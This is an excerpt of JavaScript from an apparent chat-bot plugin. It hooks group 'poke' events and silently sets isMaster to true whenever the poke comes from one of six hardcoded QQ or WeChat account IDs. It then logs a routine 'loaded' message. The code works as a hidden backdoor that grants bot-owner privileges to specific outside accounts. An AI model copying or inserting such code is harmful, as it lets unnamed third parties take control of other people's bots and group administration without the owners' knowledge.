...
Bot.GetMaster = async (e)=>{
    ...
    if (e.sub_type == 'poke'){
    if (!(e.operator_id === 2173302144 ||e.operator_id == 947309924|| e.operator_id === 197728340 || e.operator_id == 'wxid_d0qj1f49bwgf22'|| e.operator_id == '25984983967656960@openim'||e.operator_id == 'wxid_xh5txgo29pv522')) {
return
	}else{
if (!kg) return
    e.isMaster = true;
...
Bot.on('notice.group.poke',(e)=>{Bot.GetMaster(e)})
logger.info('Hm载入完成')
}catch(err){
    logger.error(err)
}
